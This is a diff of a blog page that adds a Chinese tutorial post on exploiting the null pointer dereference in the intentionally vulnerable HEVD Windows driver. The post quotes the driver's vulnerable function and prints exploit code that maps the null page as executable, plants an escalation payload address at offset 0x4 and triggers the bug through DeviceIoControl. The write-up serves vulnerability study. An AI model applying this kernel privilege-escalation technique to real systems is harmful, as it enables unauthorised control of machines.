@@ -6,15 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | 021w</title>
+  <title>HEVD内核漏洞学习(6)空指针解引用 | 021w</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="021w">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+  <meta name="description" content="0x00前言第六部分了 空指针解引用是程序中常见的一类动态内存错误 啊 还是直接开始正文吧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HEVD内核漏洞学习(6)空指针解引用">
+<meta property="og:url" content="http://yoursite.com/2020/10/25/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-6-%E7%A9%BA%E6%8C%87%E9%92%88%E8%A7%A3%E5%BC%95%E7%94%A8/index.html">
 <meta property="og:site_name" content="021w">
+<meta property="og:description" content="0x00前言第六部分了 空指针解引用是程序中常见的一类动态内存错误 啊 还是直接开始正文吧">
 <meta property="og:locale">
+<meta property="og:image" content="http://yoursite.com/2020/10/25/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-6-%E7%A9%BA%E6%8C%87%E9%92%88%E8%A7%A3%E5%BC%95%E7%94%A8/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/25/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-6-%E7%A9%BA%E6%8C%87%E9%92%88%E8%A7%A3%E5%BC%95%E7%94%A8/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/25/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-6-%E7%A9%BA%E6%8C%87%E9%92%88%E8%A7%A3%E5%BC%95%E7%94%A8/1.gif">
+<meta property="article:published_time" content="2020-10-25T08:08:15.000Z">
+<meta property="article:modified_time" content="2020-10-26T14:31:13.402Z">
 <meta property="article:author" content="021w">
+<meta property="article:tag" content="HEVD内核">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/10/25/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-6-%E7%A9%BA%E6%8C%87%E9%92%88%E8%A7%A3%E5%BC%95%E7%94%A8/1.png">
   
     <link rel="alternative" href="/atom.xml" title="021w" type="application/atom+xml">
   
@@ -124,36 +133,52 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-HEVD内核漏洞学习-6-空指针解引用" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      HEVD内核漏洞学习(6)空指针解引用
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/25/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-6-%E7%A9%BA%E6%8C%87%E9%92%88%E8%A7%A3%E5%BC%95%E7%94%A8/" class="archive-article-date">
+
+        
+        <a href="/2020/10/25/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-6-%E7%A9%BA%E6%8C%87%E9%92%88%E8%A7%A3%E5%BC%95%E7%94%A8/" class="archive-article-date">
   	<time datetime="2020-10-25T08:08:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-25</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/25/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-6-%E7%A9%BA%E6%8C%87%E9%92%88%E8%A7%A3%E5%BC%95%E7%94%A8/">HEVD内核漏洞学习(6)空指针解引用</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>第六部分了 空指针解引用是程序中常见的一类动态内存错误 啊 还是直接开始正文吧</p>
+<a id="more"></a>
+<h1 id="0x01漏洞原理"><a href="#0x01漏洞原理" class="headerlink" title="0x01漏洞原理"></a>0x01漏洞原理</h1><p>当指针设置为NULL时 试图通过空指针对数据进行访问 导致程序运行错误 即指针为空却被当作地址去引用时 就会产生漏洞</p>
+<h2 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h2><p>这个函数首先ExAllocatePoolWithTag申请内存 在用完内存后 将内存置为NULL 在漏洞版本下 未检查刚才申请的内存是否为NULL 就直接引用指向内存地址</p>
+<p><strong>TriggerNullPointerDereference</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line">TriggerNullPointerDereference(</span><br><span class="line">    _In_ PVOID UserBuffer</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    ULONG UserValue &#x3D; 0;</span><br><span class="line">    ULONG MagicValue &#x3D; 0xBAD0B0B0;</span><br><span class="line">    NTSTATUS Status &#x3D; STATUS_SUCCESS;</span><br><span class="line">    PNULL_POINTER_DEREFERENCE NullPointerDereference &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        &#x2F;&#x2F; Verify if the buffer resides in user mode</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">        ProbeForRead(UserBuffer, sizeof(NULL_POINTER_DEREFERENCE), (ULONG)__alignof(UCHAR));</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        &#x2F;&#x2F; Allocate Pool chunk</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">        NullPointerDereference &#x3D; (PNULL_POINTER_DEREFERENCE)ExAllocatePoolWithTag(</span><br><span class="line">            NonPagedPool,</span><br><span class="line">            sizeof(NULL_POINTER_DEREFERENCE),</span><br><span class="line">            (ULONG)POOL_TAG</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        if (!NullPointerDereference)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;</span><br><span class="line">            &#x2F;&#x2F; Unable to allocate Pool chunk</span><br><span class="line">            &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">            DbgPrint(&quot;[-] Unable to allocate Pool chunk\n&quot;);</span><br><span class="line"></span><br><span class="line">            Status &#x3D; STATUS_NO_MEMORY;</span><br><span class="line">            return Status;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            DbgPrint(&quot;[+] Pool Tag: %s\n&quot;, STRINGIFY(POOL_TAG));</span><br><span class="line">            DbgPrint(&quot;[+] Pool Type: %s\n&quot;, STRINGIFY(NonPagedPool));</span><br><span class="line">            DbgPrint(&quot;[+] Pool Size: 0x%X\n&quot;, sizeof(NULL_POINTER_DEREFERENCE));</span><br><span class="line">            DbgPrint(&quot;[+] Pool Chunk: 0x%p\n&quot;, NullPointerDereference);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        &#x2F;&#x2F; Get the value from user mode</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">        UserValue &#x3D; *(PULONG)UserBuffer;</span><br><span class="line"></span><br><span class="line">        DbgPrint(&quot;[+] UserValue: 0x%p\n&quot;, UserValue);</span><br><span class="line">        DbgPrint(&quot;[+] NullPointerDereference: 0x%p\n&quot;, NullPointerDereference);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        &#x2F;&#x2F; Validate the magic value</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">        if (UserValue &#x3D;&#x3D; MagicValue)</span><br><span class="line">        &#123;</span><br><span class="line">            NullPointerDereference-&gt;Value &#x3D; UserValue;</span><br><span class="line">            NullPointerDereference-&gt;Callback &#x3D; &amp;NullPointerDereferenceObjectCallback;</span><br><span class="line"></span><br><span class="line">            DbgPrint(&quot;[+] NullPointerDereference-&gt;Value: 0x%p\n&quot;, NullPointerDereference-&gt;Value);</span><br><span class="line">            DbgPrint(&quot;[+] NullPointerDereference-&gt;Callback: 0x%p\n&quot;, NullPointerDereference-&gt;Callback);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            DbgPrint(&quot;[+] Freeing NullPointerDereference Object\n&quot;);</span><br><span class="line">            DbgPrint(&quot;[+] Pool Tag: %s\n&quot;, STRINGIFY(POOL_TAG));</span><br><span class="line">            DbgPrint(&quot;[+] Pool Chunk: 0x%p\n&quot;, NullPointerDereference);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;</span><br><span class="line">            &#x2F;&#x2F; Free the allocated Pool chunk</span><br><span class="line">            &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">            ExFreePoolWithTag((PVOID)NullPointerDereference, (ULONG)POOL_TAG);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;</span><br><span class="line">            &#x2F;&#x2F; Set to NULL to avoid dangling pointer</span><br><span class="line">            &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">            NullPointerDereference &#x3D; NULL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">#ifdef SECURE</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        &#x2F;&#x2F; Secure Note: This is secure because the developer is checking if</span><br><span class="line">        &#x2F;&#x2F; &#39;NullPointerDereference&#39; is not NULL before calling the callback function</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">        if (NullPointerDereference)</span><br><span class="line">        &#123;</span><br><span class="line">            NullPointerDereference-&gt;Callback();</span><br><span class="line">        &#125;</span><br><span class="line">#else</span><br><span class="line">        DbgPrint(&quot;[+] Triggering Null Pointer Dereference\n&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        &#x2F;&#x2F; Vulnerability Note: This is a vanilla Null Pointer Dereference vulnerability</span><br><span class="line">        &#x2F;&#x2F; because the developer is not validating if &#39;NullPointerDereference&#39; is NULL</span><br><span class="line">        &#x2F;&#x2F; before calling the callback function</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">        NullPointerDereference-&gt;Callback();                &#x2F;&#x2F;漏洞点</span><br><span class="line">#endif</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status &#x3D; GetExceptionCode();</span><br><span class="line">        DbgPrint(&quot;[-] Exception Code: 0x%X\n&quot;, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-        <div class="article-info info-on-right">
-          
+<h1 id="0x02漏洞分析"><a href="#0x02漏洞分析" class="headerlink" title="0x02漏洞分析"></a>0x02漏洞分析</h1><p>先下断点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp HEVD!TriggerNullPointerDereference+143</span><br></pre></td></tr></table></figure>
+<p>断下后发现第二个值还没有被覆盖为shellcode的地址<br><img src="1.png"><br>单步指向后发现已被覆盖<br><img src="2.png"><br>即我们将NullPointerDereference的第二个值（+0x4）控制为shellcode的地址即可 使用NtAllocateVirtualMemory分配0页内存将第二个值（+0x4）控制为shellcode的地址</p>
+<h1 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h1><h2 id="分配内存"><a href="#分配内存" class="headerlink" title="分配内存"></a>分配内存</h2><p>在common.c中分配0页内存</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">BOOL MapNullPage() &#123;</span><br><span class="line">    HMODULE hNtdll;</span><br><span class="line">    SIZE_T RegionSize &#x3D; 0x1000;            &#x2F;&#x2F; will be rounded up to the next host</span><br><span class="line">                                           &#x2F;&#x2F; page size address boundary -&gt; 0x2000</span><br><span class="line"></span><br><span class="line">    PVOID BaseAddress &#x3D; (PVOID)0x00000001; &#x2F;&#x2F; will be rounded down to the next host</span><br><span class="line">                                           &#x2F;&#x2F; page size address boundary -&gt; 0x00000000</span><br><span class="line">    NTSTATUS NtStatus &#x3D; STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    hNtdll &#x3D; GetModuleHandle(&quot;ntdll.dll&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Grab the address of NtAllocateVirtualMemory</span><br><span class="line">    NtAllocateVirtualMemory &#x3D; (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);</span><br><span class="line"></span><br><span class="line">    if (!NtAllocateVirtualMemory) &#123;</span><br><span class="line">        DEBUG_ERROR(&quot;\t\t[-] Failed Resolving NtAllocateVirtualMemory: 0x%X\n&quot;, GetLastError());</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Allocate the Virtual memory</span><br><span class="line">    NtStatus &#x3D; NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,</span><br><span class="line">                                       &amp;BaseAddress,</span><br><span class="line">                                       0,</span><br><span class="line">                                       &amp;RegionSize,</span><br><span class="line">                                       MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,</span><br><span class="line">                                       PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    if (NtStatus !&#x3D; STATUS_SUCCESS) &#123;</span><br><span class="line">        DEBUG_ERROR(&quot;\t\t\t\t[-] Virtual Memory Allocation Failed: 0x%x\n&quot;, NtStatus);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        DEBUG_INFO(&quot;\t\t\t[+] Memory Allocated: 0x%p\n&quot;, BaseAddress);</span><br><span class="line">        DEBUG_INFO(&quot;\t\t\t[+] Allocation Size: 0x%X\n&quot;, RegionSize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FreeLibrary(hNtdll);</span><br><span class="line"></span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">__try &#123;</span><br><span class="line">        &#x2F;&#x2F; Get the device handle</span><br><span class="line">        DEBUG_MESSAGE(&quot;\t[+] Getting Device Driver Handle\n&quot;);</span><br><span class="line">        DEBUG_INFO(&quot;\t\t[+] Device Name: %s\n&quot;, FileName);</span><br><span class="line"></span><br><span class="line">        hFile &#x3D; GetDeviceHandle(FileName);</span><br><span class="line"></span><br><span class="line">        if (hFile &#x3D;&#x3D; INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">            DEBUG_ERROR(&quot;\t\t[-] Failed Getting Device Handle: 0x%X\n&quot;, GetLastError());</span><br><span class="line">            exit(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            DEBUG_INFO(&quot;\t\t[+] Device Handle: 0x%X\n&quot;, hFile);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DEBUG_MESSAGE(&quot;\t[+] Setting Up Vulnerability Stage\n&quot;);</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(&quot;\t\t[+] Mapping Null Page\n&quot;);</span><br><span class="line"></span><br><span class="line">        if (!MapNullPage()) &#123;</span><br><span class="line">            DEBUG_ERROR(&quot;\t\t[-] Failed Mapping Null Page: 0x%X\n&quot;, GetLastError());</span><br><span class="line">            exit(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(&quot;\t\t[+] Preparing Null Page Memory Layout\n&quot;);</span><br><span class="line"></span><br><span class="line">        NullPointerPlus4 &#x3D; (PVOID)((ULONG)NullPageBaseAddress + 0x4); &#x2F;&#x2F;主要关注这里将偏移为4的位置设置为shellcode的地址</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Now set the function pointer</span><br><span class="line">        *(PULONG)NullPointerPlus4 &#x3D; (ULONG)EopPayload;</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(&quot;\t\t\t[+] NullPage+0x4 Value: 0x%p\n&quot;, *(PULONG)NullPointerPlus4);</span><br><span class="line">        DEBUG_INFO(&quot;\t\t\t[+] NullPage+0x4 Address: 0x%p\n&quot;, NullPointerPlus4);</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(&quot;\t\t[+] EoP Payload: 0x%p\n&quot;, EopPayload);</span><br><span class="line"></span><br><span class="line">        DEBUG_MESSAGE(&quot;\t[+] Triggering Null Pointer Dereference\n&quot;);</span><br><span class="line"></span><br><span class="line">        OutputDebugString(&quot;****************Kernel Mode****************\n&quot;);</span><br><span class="line"></span><br><span class="line">        DeviceIoControl(hFile,</span><br><span class="line">                        HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,</span><br><span class="line">                        (LPVOID)&amp;MagicValue,</span><br><span class="line">                        0,</span><br><span class="line">                        NULL,</span><br><span class="line">                        0,</span><br><span class="line">                        &amp;BytesReturned,</span><br><span class="line">                        NULL);</span><br><span class="line"></span><br><span class="line">        OutputDebugString(&quot;****************Kernel Mode****************\n&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="1.gif"></p>
+<h1 id="0x05经验总结"><a href="#0x05经验总结" class="headerlink" title="0x05经验总结"></a>0x05经验总结</h1><p>啊这个比上个好理解多了 空指针解引用导致的问题在这个漏洞中也很好利用 在刚开始了解的时候只知道能引发崩溃 不知道如何去利用 后面学习完了之后也就懂了利用的思路了 然后去看了看小刀师傅复现的一个内核漏洞 完全就不一样了哈哈哈</p>
+<p>这里(传送门)[<a target="_blank" rel="noopener" href="https://xiaodaozhi.com/exploit/149.html]">https://xiaodaozhi.com/exploit/149.html]</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -165,364 +190,54 @@
 		</ul>
 	</div>
 
-          
+      
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/24/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-5-%E6%B1%A0%E6%BA%A2%E5%87%BA/" class="archive-article-date">
-  	<time datetime="2020-10-24T08:56:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-24</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2020/10/24/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-5-%E6%B1%A0%E6%BA%A2%E5%87%BA/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">HEVD内核漏洞学习(5)池溢出</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/24/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-5-%E6%B1%A0%E6%BA%A2%E5%87%BA/">HEVD内核漏洞学习(5)池溢出</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">HEVD内核</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/23/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-4-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" class="archive-article-date">
-  	<time datetime="2020-10-23T15:12:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-23</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/23/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-4-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">HEVD内核漏洞学习(4)-整数溢出</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">HEVD内核</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/23/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-3-%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" class="archive-article-date">
-  	<time datetime="2020-10-23T07:23:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-23</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/23/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-3-%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/">HEVD内核漏洞学习-3-类型混淆</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">HEVD内核</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-2-UAF/" class="archive-article-date">
-  	<time datetime="2020-10-22T13:52:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-22</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-2-UAF/">HEVD内核漏洞学习(2)-UAF</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">HEVD内核</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
